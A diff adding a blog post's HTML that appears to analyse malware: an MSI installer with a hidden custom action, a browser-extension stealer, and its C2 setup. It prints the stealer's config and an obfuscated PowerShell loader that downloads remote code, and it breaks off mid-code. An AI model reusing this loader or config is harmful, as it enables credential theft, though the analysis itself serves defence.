@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions - N0tR3al Hub</title><meta name="Description" content="Malware &amp; Reverse Engineering &amp; Some Other Stuff"><meta property="og:url" content="http://localhost:1313/malicious_extension/">
+  <meta property="og:site_name" content="N0tR3al Hub">
+  <meta property="og:title" content="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions">
+  <meta property="og:description" content="Overview While randomly navigating, I found a very interesting malware, that while analyzing it didn’t create a traditional persistence on the machine via the registry, services, scheduled tasks, etc. Instead, it created a malicious extension on all of the user’s browsers. Additionally, the initial stage used a very interesting feature of the MSI file to execute a CustomAction from a DLL. This is a very in-depth analysis, so I hope you enjoy it!">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-01T09:00:00-03:00">
+    <meta property="article:modified_time" content="2025-05-01T09:00:00-03:00">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions">
+  <meta name="twitter:description" content="Overview While randomly navigating, I found a very interesting malware, that while analyzing it didn’t create a traditional persistence on the machine via the registry, services, scheduled tasks, etc. Instead, it created a malicious extension on all of the user’s browsers. Additionally, the initial stage used a very interesting feature of the MSI file to execute a CustomAction from a DLL. This is a very in-depth analysis, so I hope you enjoy it!">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/static/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/static/apple-touch-icon.png"><link rel="mask-icon" href="/static/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/malicious_extension/" /><link rel="prev" href="http://localhost:1313/atm_malware/" /><link rel="next" href="http://localhost:1313/zero2auto_custom/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Malicious Browser Extension Analysis: MSI installer -\u003e malicious extension -\u003e C2 domain hidden in crypto transactions",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/malicious_extension\/"
+        },"image": ["https:\/\/avatars.githubusercontent.com\/u\/181849985?v=4"],"genre": "posts","wordcount":  2699 ,
+        "url": "http:\/\/localhost:1313\/malicious_extension\/","datePublished": "2025-05-01T09:00:00-03:00","dateModified": "2025-05-01T09:00:00-03:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/avatars.githubusercontent.com\/u\/181849985?v=4"},"author": {
+                "@type": "Person",
+                "name": "Lucas Volpiano"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="N0tR3al Hub">Malware &amp; Reverse Engineering &amp; Some Other Stuff</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="N0tR3al Hub">Malware &amp; Reverse Engineering &amp; Some Other Stuff</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Malicious Browser Extension Analysis: MSI installer -> malicious extension -> C2 domain hidden in crypto transactions</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Lucas Volpiano</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-01">2025-05-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2699 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#analysis">Analysis</a>
+          <ul>
+            <li><a href="#msi-file">MSI file</a></li>
+            <li><a href="#malicious-browser-extension">Malicious Browser Extension</a></li>
+            <li><a href="#the-c2-domain-on-a-crypto-transaction">The C2 Domain on a Crypto transaction</a></li>
+          </ul>
+        </li>
+        <li><a href="#concluding-thoughts">Concluding Thoughts</a></li>
+        <li><a href="#iocs">IOCs</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h3 id="overview">Overview</h3>
+<p>While randomly navigating, I found a very interesting malware, that while analyzing it didn&rsquo;t create a traditional persistence on the machine via the registry, services, scheduled tasks, etc. Instead, it created a malicious extension on all of the user&rsquo;s browsers. Additionally, the initial stage used a very interesting feature of the MSI file to execute a CustomAction from a DLL. This is a very in-depth analysis, so I hope you enjoy it!</p>
+<img src="/static/Extension/Malextension.png" alt="drawing" width="1000"/>
+<h3 id="analysis">Analysis</h3>
+<p>How It Started&hellip;Of course, with a fake captcha, but not the typical &ldquo;WIN + R, then CTRL + V and Enter&rdquo; kind. This one used an image captcha where each wrong selection redirected to a random site. However, selecting the correct image it redirects to the malmware:</p>
+<img src="/static/Extension/Pasted image 20250522135407.png" alt="drawing" width="1000"/>
+<p>The domain contains a password and a link to a MEGA file. (Interestingly, the MEGA link changed daily but always led to the same malware on diferent files.)</p>
+<img src="/static/Extension/Pasted image 20250524130150.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524130136.png" alt="drawing" width="1000"/>
+<p>Extracting the ZIP file revealed another compressed file and an image with the password &ldquo;2025&rdquo;:</p>
+<img src="/static/Extension/Pasted image 20250526180713.png" alt="drawing" width="300"/>
+<p>Extracting again, we found the MSI file setup.msi and a file named ._ with an unusually large size, likely to evade analysis in sandboxes with file size limits. Soon, we discovered that it initially installs &ldquo;Task Coach&rdquo; but bundles some suspicious additions.</p>
+<img src="/static/Extension/Pasted image 20250526180632.png" alt="drawing" width="300"/>
+<img src="/static/Extension/Pasted image 20250527215254.png" alt="drawing" width="1000"/>
+<h4 id="msi-file">MSI file</h4>
+<p>So lets start using <a href="https://learn.microsoft.com/en-us/windows/win32/msi/orca-exe" target="_blank" rel="noopener noreffer ">orca</a> to analyse the MSI file!</p>
+<p>In MSI file it is possible to set custom actions, like execute binarys, scripts, <strong>call DLL functions</strong>, modify registry keys and etc. In our sample, we found a call to the function SendCollectedData from DataUploader.dll;</p>
+<p>Here a example of DLL that permits MSI custom actions call its functions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#include &lt;windows.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;msi.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;msiquery.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Helper</span> <span class="n">to</span> <span class="nb">log</span> <span class="n">messages</span> <span class="n">to</span> <span class="n">the</span> <span class="n">MSI</span> <span class="n">installer</span> <span class="nb">log</span>
+</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">LogMessage</span><span class="p">(</span><span class="n">MSIHANDLE</span> <span class="n">hInstall</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span><span class="o">*</span> <span class="n">message</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sprintf_s</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s2">&#34;CustomAction: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PMSIHANDLE</span> <span class="n">hRecord</span> <span class="o">=</span> <span class="n">MsiCreateRecord</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MsiRecordSetStringA</span><span class="p">(</span><span class="n">hRecord</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MsiProcessMessage</span><span class="p">(</span><span class="n">hInstall</span><span class="p">,</span> <span class="n">INSTALLMESSAGE_INFO</span><span class="p">,</span> <span class="n">hRecord</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Exported</span> <span class="n">custom</span> <span class="n">action</span> <span class="n">function</span> <span class="n">with</span> <span class="n">MessageBox</span>
+</span></span><span class="line"><span class="cl"><span class="n">extern</span> <span class="s2">&#34;C&#34;</span> <span class="n">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">UINT</span> <span class="n">__stdcall</span> <span class="n">MyCustomAction</span><span class="p">(</span><span class="n">MSIHANDLE</span> <span class="n">hInstall</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LogMessage</span><span class="p">(</span><span class="n">hInstall</span><span class="p">,</span> <span class="s2">&#34;Starting MyCustomAction with MessageBox.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">MessageBoxA</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;This is a message box from a Custom Action in an MSI installer.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Custom Action Message&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MB_OK</span> <span class="o">|</span> <span class="n">MB_ICONINFORMATION</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">LogMessage</span><span class="p">(</span><span class="n">hInstall</span><span class="p">,</span> <span class="s2">&#34;MyCustomAction completed.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="/static/Extension/Pasted image 20250526193939.png" alt="drawing" width="1000"/>
+<p>Even more suspicious with this CustomActionDatas:</p>
+<img src="/static/Extension/Pasted image 20250526182755.png" alt="drawing" width="1000"/>
+<p>Lets dump all files from the MSI and inspected DataUploader.dll. Other DLLs, like sqlite3.dll, also stood out, commonly used by stealers.</p>
+<img src="/static/Extension/Pasted image 20250526215729.png" alt="drawing" width="1000"/>
+<p>The custom action names were self-explanatory. Analyzing the DLL, we saw it used MsiSetPropertyW to set results in variables like HttpPostServerResponse and MsiGetPropertyW to retrieve values from custom action data (e.g., HttpPostUrl). (The DLL&rsquo;s logic is complex, so this is a simplified summary.)</p>
+<img src="/static/Extension/Pasted image 20250526200121.png" alt="drawing" width="1000"/>
+<p>We can see that some arguments are being defined by the response of the uploded data to kantorpusatsbl[.]com[/]diagnostics[.]php,</p>
+<img src="/static/Extension/Pasted image 20250526182739.png" alt="drawing" width="1000"/>
+<p>Interestingly verif.bat and tpm2emu.exe use the same argument that is defined by the response of attacker server.</p>
+<img src="/static/Extension/Pasted image 20250526182943.png" alt="drawing" width="1000"/>
+<p>Taking a look at the verif.bat was a script using 7z to extract topic.dat, protected by a password passed as the second command-line argument. The connection to the malicious domain was likely to retrieve this password for the next malware stages.</p>
+<img src="/static/Extension/Pasted image 20250526220434.png" alt="drawing" width="1000"/>
+<p>Executing the MSI and monitoring with ProcMon, we observed a successful connection to kantorpusatsbl[.]com/diagnostics.php and the execution of 7z. We copied the password:</p>
+<img src="/static/Extension/Pasted image 20250524120645.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524135046.png" alt="drawing" width="1000"/>
+<p>And in the topic.dat we have 4 DLLs, some legit and others pretty suspicious with invalid signatures, but soon we will take a closer look</p>
+<img src="/static/Extension/Pasted image 20250526224724.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524190159.png" alt="drawing" width="1000"/>
+<p>Continuing we can see something very strange, explorer.exe executed powershell, 100% a process injection, but lets keep looking.</p>
+<img src="/static/Extension/Pasted image 20250524131242.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524115751.png" alt="drawing" width="1000"/>
+<p>And without a doubt, this is a stealer. It searched for: the &ldquo;local state&rdquo; of a lot different browsers (It first do that and the ones he actully find the file, then it searchs for the cookies), crypto extensions, .kbdx files (KeePass databases), crypto wallets and the list go on.</p>
+<img src="/static/Extension/Pasted image 20250527210444.png" alt="drawing" width="1000"/>
+<p>PowerShell also created files resembling a browser extension&rsquo;s structure:</p>
+<img src="/static/Extension/Pasted image 20250524144741.png" alt="drawing" width="1000"/>
+<p>Since tpm2emu.exe used the password from the malicious domain, we suspected it was responsible for injecting into explorer.exe. Running it without arguments revealed a bad chess game:</p>
+<img src="/static/Extension/Pasted image 20250524190334.png" alt="drawing" width="1000"/>
+<p>The malware relied entirely on the password passed to 7z and tpm2emu.exe. The latter required the extracted DLLs, particularly libcrypto-1_1-x64.dll, which had suspicious exports among legitimate ones:</p>
+<img src="/static/Extension/Pasted image 20250527222231.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524190228.png" alt="drawing" width="1000"/>
+<p>Debugging with breakpoints on injection-related functions (e.g., VirtualAlloc), we spotted the injection into explorer.exe and a malicious executable:</p>
+<img src="/static/Extension/Pasted image 20250524220836.png" alt="drawing" width="1000"/>
+<p>Dumping and debugging this executable revealed the stealer and the PowerShell executor:</p>
+<img src="/static/Extension/Pasted image 20250525091442.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250525095137.png" alt="drawing" width="1000"/>
+<p>Its even possible to spot the download of the stealer settings</p>
+<img src="/static/Extension/Pasted image 20250525093954.png" alt="drawing" width="1000"/>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;ffb5a70b8263515&#34;</span><span class="p">:</span> <span class="s2">&#34;f2bfd8bf6966c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;opcode&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;access_token&#34;</span><span class="p">:</span> <span class="s2">&#34;XXXXXXXXXXXXXXXXXXX&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;self_delete&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;take_screenshot&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;loader&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;steal_steam&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;steal_outlook&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;browsers&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Google Chrome&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">Google</span><span class="se">\\</span><span class="s2">Chrome</span><span class="se">\\</span><span class="s2">User Data&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;soft_path&#34;</span><span class="p">:</span> <span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Program Files</span><span class="se">\\</span><span class="s2">Google</span><span class="se">\\</span><span class="s2">Chrome</span><span class="se">\\</span><span class="s2">Application</span><span class="se">\\</span><span class="s2">chrome.exe&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;use_v20&#34;</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;parse_cookies&#34;</span><span class="p">:</span> <span class="bp">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;parse_logins&#34;</span><span class="p">:</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are a lot of interesting functions in this malware, but to make this simpler, I&rsquo;m only highlighting the principal ones.</p>
+<p>Now lets analyse the encoded powershell command now. Decoding the command we have a decoding routine and a XOR execution on the result, then again another decoding routine and execution of a remote downloaded script using iex</p>
+<img src="/static/Extension/Pasted image 20250524121436.png" alt="drawing" width="1000"/>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">uPlik</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;DhsMWR4bDQFFIRMfGQc5RVwbD0UMXQMeGgg4EEUkPSceLAMoWl8TBSo@ADIBM1IEGlwQWF0TXQcYKjlf&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">LXxNl</span> <span class="o">=</span> <span class="o">$</span><span class="n">uPlik</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="o">//</span> <span class="n">litterally</span> <span class="n">changing</span> <span class="n">one</span> <span class="err">@</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">w0JeK</span> <span class="o">=</span> <span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="o">$</span><span class="n">LXxNl</span><span class="p">)</span> <span class="o">|</span> <span class="n">ForEach</span><span class="o">-</span><span class="ne">Object</span> <span class="p">{</span> <span class="o">$</span><span class="n">_</span> <span class="o">-</span><span class="n">bxor</span> <span class="mi">106</span><span class="p">}</span> <span class="o">//</span> <span class="n">XOR</span> <span class="n">operation</span> 
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">Jsj3T</span> <span class="o">=</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="o">$</span><span class="n">w0JeK</span><span class="p">)</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="o">//</span> <span class="n">changing</span> <span class="s1">&#39;a&#39;</span> <span class="k">for</span> <span class="err">@</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">vwTAS</span> <span class="o">=</span> <span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="o">$</span><span class="n">Jsj3T</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">Jv0mm</span> <span class="o">=</span> <span class="p">[</span><span class="n">byte</span><span class="p">[]](</span><span class="mi">30</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">219</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">ijO7J</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">xV7Um</span> <span class="o">=</span> <span class="o">$</span><span class="n">vwTAS</span> <span class="o">|</span> <span class="n">ForEach</span><span class="o">-</span><span class="ne">Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">_</span> <span class="o">-</span><span class="n">bxor</span> <span class="o">$</span><span class="n">Jv0mm</span><span class="p">[</span><span class="o">$</span><span class="n">ijO7J</span><span class="o">++</span><span class="p">];</span> <span class="o">//</span> <span class="n">XOR</span> <span class="n">operation</span> <span class="n">again</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">ijO7J</span> <span class="o">-</span><span class="n">ge</span> <span class="o">$</span><span class="n">Jv0mm</span><span class="o">.</span><span class="n">Length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">ijO7J</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">nHpjI</span><span class="o">=</span><span class="n">new</span><span class="o">-</span><span class="n">object</span> <span class="n">System</span><span class="o">.</span><span class="n">Net</span><span class="o">.</span><span class="n">Webclient</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">cSLnS</span> <span class="o">=</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="o">$</span><span class="n">xV7Um</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">zGfxA</span><span class="o">=$</span><span class="n">nHpjI</span><span class="o">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="o">$</span><span class="n">cSLnS</span><span class="p">);</span>
